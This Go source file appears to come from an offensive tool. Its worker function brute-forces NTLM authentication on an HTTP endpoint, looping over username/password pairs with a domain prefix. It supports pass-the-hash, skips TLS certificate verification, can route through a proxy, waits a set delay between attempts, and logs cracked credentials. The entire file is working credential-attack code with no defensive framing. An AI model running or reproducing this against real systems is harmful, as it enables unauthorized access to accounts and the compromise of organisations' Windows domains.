package lib

import (
	"crypto/tls"
	"github.com/X1r0z/go-ntlmssp"
	"net/http"
	"net/url"
	"time"
)

func NtlmBruteWorker(info *TaskInfo) {

	for data := range info.task {
		username, password := data[0], data[1]
		if info.done.Get(username) {
			continue
		}
		Log.Debug("[*] 尝试: %v:%v", username, password)

		client := &http.Client{
			Transport: ntlmssp.Negotiator{
				RoundTripper: &http.Transport{
					TLSClientConfig: &tls.Config{
						InsecureSkipVerify: true,
						Renegotiation:      tls.RenegotiateOnceAsClient,
					},
					Proxy: func(_ *http.Request) (*url.URL, error) {
						if info.proxy != "" {
							return url.Parse(info.proxy)
						} else {
							return nil, nil
						}
					},
				},
				UsePth: info.usePth,
			},
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}

		req, _ := http.NewRequest("GET", info.u, nil)
		req.SetBasicAuth(info.domain+"\\"+username, password)
		res, err := client.Do(req)
		if err != nil {
			panic(err)
		}
		if res.StatusCode != 401 && res.StatusCode != 408 && res.StatusCode != 504 {
			Log.Success("[+] 成功: %v", username+":"+password)
			info.done.Set(username, password, info.o)
		} else {
			Log.Failed("[-] 失败: %v", username+":"+password)
		}
		time.Sleep(time.Second * time.Duration(info.delay))
	}
}
